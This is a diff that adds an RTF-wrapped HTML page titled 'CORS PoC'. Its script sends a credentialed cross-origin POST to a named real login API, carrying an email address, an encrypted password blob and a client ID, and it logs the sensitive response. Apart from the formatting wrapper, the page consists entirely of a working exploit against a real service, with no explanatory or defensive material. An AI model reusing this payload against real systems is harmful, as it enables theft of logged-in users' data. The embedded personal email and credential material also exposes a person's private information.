@@ -1,0 +1,40 @@
+{\rtf1\ansi\ansicpg1252\cocoartf2822
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fswiss\fcharset0 Helvetica;\f1\fswiss\fcharset0 Helvetica-Oblique;}
+{\colortbl;\red255\green255\blue255;\red19\green18\blue28;\red255\green255\blue255;\red15\green126\blue255;
+}
+{\*\expandedcolortbl;;\cssrgb\c9412\c9412\c14510;\cssrgb\c100000\c100000\c100000;\cssrgb\c0\c58431\c100000;
+}
+\margl1440\margr1440\vieww23100\viewh17900\viewkind0
+\deftab720
+\pard\pardeftab720\partightenfactor0
+
+\f0\fs24 \cf2 \cb3 \expnd0\expndtw0\kerning0
+\outl0\strokewidth0 \strokec2 <html lang=\'93en\'94>\
+<head>\
+<meta charset=\'93UTF-8\'94>\
+<title>CORS PoC</title>\
+</head>\
+<body>\
+<h1>CORS Vulnerability PoC</h1>\
+<script>\
+fetch(\'91{\field{\*\fldinst{HYPERLINK "https://razerid.razer.com/api/emily/7/login/get"}}{\fldrslt \cf4 \strokec4 https://razerid.razer.com/api/emily/7/login/get}}\'92, \{\
+method: \'91POST\'92,\
+headers: \{\
+\'91Content-Type\'92: \'91application/json\'92,\
+\'91Accept\'92: \'91application/json, text/plain,\'a0
+\f1\i /
+\f0\i0 \'92\
+\},\
+credentials: \'91include\'92, // Includes cookies for authentication\
+body: JSON.stringify(\{\
+data: \'93<COP><User><email>{\field{\*\fldinst{HYPERLINK "mailto:aliyasser0115139@gmail.com"}}{\fldrslt \cf4 \strokec4 aliyasser0115139@gmail.com}}</email><password>U2FsdGVkX19pKgwM4RvXNv8bZ2mfd9DhS4hi82e/0oKDfS/X3qwilz4AVAUftfV9Z3wkfF6I+/yyAijB3dIhVg==</password></User><ServiceCode>0060</ServiceCode></COP>\'94,\
+encryptedPw: \'93rev1\'94,\
+clientId: \'93b8bfda921fb67abed94266c89d4695f38dc63df2\'94\
+\})\
+\})\
+.then(response => response.text())\
+.then(data => console.log(\'91Response:\'92, data)) // Logs the sensitive XML response\
+.catch(error => console.error(\'91Error:\'92, error));\
+</script>\
+</body>\
+</html>}
